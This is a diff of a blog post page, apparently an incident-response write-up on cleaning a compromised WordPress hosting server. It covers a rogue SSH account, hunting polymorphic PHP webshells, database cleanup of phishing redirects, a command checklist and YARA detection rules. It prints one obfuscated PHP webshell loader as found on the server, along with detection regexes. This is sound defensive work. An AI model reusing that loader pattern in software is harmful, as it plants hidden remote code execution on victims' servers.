@@ -494,10 +494,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
+  <a href="#end-of-the-first-day" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Conclusion
+        End of the First Day...
       
     </span>
   </a>
@@ -717,6 +717,17 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contact-me" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contact Me
+      
+    </span>
+  </a>
   
 </li>
       
@@ -929,10 +940,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
+  <a href="#end-of-the-first-day" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Conclusion
+        End of the First Day...
       
     </span>
   </a>
@@ -1156,6 +1167,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#contact-me" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contact Me
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#references" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1209,7 +1231,7 @@ I state this as the patterns and languages varied amongst the samples I found.</
 </blockquote>
 <hr />
 <h2 id="introduction">Introduction</h2>
-<p>The client contacted me, explaining that his server (which I had not seen before) has been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to <code>https://ushort.dev</code> and other similar URLs.  </p>
+<p>The client contacted me, explaining that his server (which I had not seen before) had been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to <code>https://ushort.dev</code> and other similar URLs.  </p>
 <p>I intentionally left out some parts of this investigation to prevent a bloated blog. But one of the early actions I took when accessing the server via SSH was to grep for the <code>ushort</code> string in the webroot of one of the affected sites to see what files come up. This only reveal temporary logs from cPanel based on actions already taken by the user which is what lead me to take a different approach.</p>
 <hr />
 <h2 id="log-analysis">Log analysis</h2>
@@ -1230,7 +1252,13 @@ last
 grep &quot;USERNAME&quot; ~/.bash_history
 </code></pre>
 <p>I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official.
-But when looking at <code>last</code> command's output, I enumerated their IP address with <code>ip-api.com</code> JSON API which showed me the user was connecting from a static IP in Washington DC. </p>
+But when looking at <code>last</code> command's output, I enumerated their IP address with <code>ip-api.com</code> JSON API which showed me the user was connecting from a static IP in Washington DC. 
+I have my own alias on my host system to quickly enumerate an IP address:</p>
+<pre><code class="language-bash">enum_ip() {
+    ip_address=$1
+    curl -s &quot;http://ip-api.com/json/$ip_address?fields=66846719&quot; | jq
+}
+</code></pre>
 <p>None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.</p>
 <p>I then looked at all the processes and their child processes but this didn't reveal anything interesting. But the active network connections showed ESTABLISHED connections to foreign IP addresses (listed under 'Attacker IPs'). I found active connections on port 111 and immediately killed the process and masked the service.</p>
 <pre><code class="language-bash"># Processes and there child processes
@@ -1239,10 +1267,12 @@ ps -auxf
 # All open files showing process IDs and Connection status - Credit: John Strand
 lsof -i -P
 </code></pre>
-<p>I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geolock the server to disconnect any foreign clients immediately making it easier to work on and clean up. I then added the geolock and locked some of the ports I saw which were open and added the global xmlrpc deny rule, and blocked and removed the strange SSH user account.</p>
+<p>I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geo-lock the server to disconnect any foreign clients immediately making it easier to work on and clean up. </p>
+<p>I then added the geo-lock and locked some of the ports I saw which were open and added the global <code>xmlrpc</code> deny rule, and blocked and removed the strange SSH user account.
+Now I bought myself some time to dig... and dig I did :D</p>
 <hr />
 <h2 id="finding-persistence">Finding Persistence</h2>
-<p>I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts.</p>
+<p>I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts based on the current evidences.</p>
 <p>The focus then turned to the /home directory and Claude gave me the following line:</p>
 <pre><code class="language-bash">stat /home/user/public_html/shell.php
 </code></pre>
@@ -1252,8 +1282,8 @@ find /home -name &quot;script.php&quot; &gt; script_file_find_output.txt
 </code></pre>
 <p>So I looked at the output and about the 10th line down, one line immediately stood out:<br />
 <strong><code>/home/REDACTED/cpmove.psql.1312886056/teaniou/ytdkrwn/iazvlpc/shell.php</code></strong><br />
-This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with <code>vi</code> and had a look...
-At this point my heart started racing from excitement, I'm sure we all know the feeling. This is what I saw:</p>
+This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with <code>vi</code> and had a look...</p>
+<p>At this point my heart started racing with excitement, I'm sure we all know the feeling. This is what I saw:</p>
 <pre><code class="language-php">&lt;?php
 $JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','&gt;',$DPAQ('qpfxhbaelk','&lt;',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
 ?&gt;
@@ -1261,9 +1291,10 @@ $JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr
 <p>BOOM! Text book obfuscation, great. I then went back to my text file and looked for more paths like it and found another 3 of them:<br />
 <strong><code>/home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php</code></strong><br />
 <strong><code>/home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php</code></strong><br />
-<strong><code>/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php</code></strong><br />
-In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all <strong><code>(__FILE__),-OFFSET</code></strong><br />
-I then asked Claude to give me the best way to find all of these files across the file system using this regex <strong><code>\( __FILE__ \),-[0-9]+</code></strong> </p>
+<strong><code>/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php</code></strong>  </p>
+<p>In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all <strong><code>(__FILE__),-OFFSET</code></strong><br />
+I then asked Claude to give me the best way to find all of these files across the file system using this regex <strong><code>\( __FILE__ \),-[0-9]+</code></strong> 
+In hide sight, this was not the best way to find them but it worked.</p>
 <pre><code class="language-bash"># Find all the php files with this pattern in them under first all the webroot folders then the filesystem
 grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; /home/*/public_html/ &gt;&gt; possible_malware.txt
 grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; / &gt;&gt; possible_malware.txt
@@ -1273,7 +1304,7 @@ grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; / &gt;&gt; possib
 </code></pre>
 <p>I started with only the webroots but after seeing how quickly it output results outside of what I had already found, I then switched to the root filesystem. A few minutes later, I sat with a 216 unique instances across the file system.  </p>
 <blockquote>
-<p>See the companion <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">Malware Analysis</a> for breakdown of the shell's obfuscation and polymorphism mechanisms.</p>
+<p>See the companion <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">Malware Analysis</a> for breakdown of the shell's obfuscation mechanisms.</p>
 </blockquote>
 <hr />
 <h2 id="cleaning-up-the-database">Cleaning Up The Database</h2>
@@ -1284,6 +1315,8 @@ grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; / &gt;&gt; possib
 </ul>
 <p>In wp-options the <strong>home</strong> column had a <code>ushort</code> link in it, redirecting any visitor to the phising site.
 A custom bash script was used to clean up all the database entries.</p>
+<p>All this script did was to use the wp cli tool to clean up the tables, but this was not perfect and did not catch everything.
+I would later create another bash script that iterates through each table and column to find these patterns and flush them out.</p>
 <pre><code class="language-bash">#!/usr/bin/bash
 WP_CLI=&quot;/usr/local/bin/wp&quot;
 REGEX_META='&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+&quot; \/&gt;\s*'
@@ -1322,9 +1355,9 @@ for user in $(ls -1 /var/cpanel/users | grep -v system); do
 done
 </code></pre>
 <hr />
-<h2 id="conclusion">Conclusion</h2>
-<p>At this point it was about 4AM and had to get ready for my day job. I compiled my hours,findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  </p>
-<p>If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.</p>
+<h2 id="end-of-the-first-day">End of the First Day...</h2>
+<p>At this point it was about 4AM and had to get ready for my day job. I compiled my hours, findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  </p>
+<p>But wait... there is more to come. In the very near future I will share the additional days of this investigation.</p>
 <hr />
 <h2 id="environment">Environment</h2>
 <table>
@@ -1693,6 +1726,10 @@ grep -rnP &quot;\\\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za
 
 # Look for any suspicious shell sessions and from which IP they originate 
 last
+# Check if the suspcious username appears in the bash history
+grep &quot;USERNAME&quot; ~/.bash_history
+# Decode the unix timestamp in .bash_history
+date -d @1782931826
 
 # Find world writable directories on the system - possible places to find foreign files
 find / -xdev -perm /1000 -type d
@@ -1758,7 +1795,9 @@ cat /etc/crontab
 ls /etc/cron.*
 
 # Find all user accounts with shell access
+grep &quot;/bin/bash&quot; /etc/passwd
 cat /etc/passwd | grep -vE &quot;nologin|false|sync&quot;
+sort -n -t: /etc/passwd | grep -vE &quot;nologin|noshell|false|halt|shutdown|sync&quot;
 </code></pre>
 <h3 id="custom-yara-rules-using-yara-x">Custom YARA Rules (Using Yara-X)</h3>
 <p>Should someone be able to improve on the YARA rules below, please let me know.
@@ -1842,6 +1881,8 @@ rule AnonymousFox_PHP_Webshell {
                 (any of ($php*) or any of ($html*)) and $pattern
 }
 </code></pre>
+<h2 id="contact-me">Contact Me</h2>
+<p>If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.</p>
 <hr />
 <h2 id="references">References</h2>
 <ul>
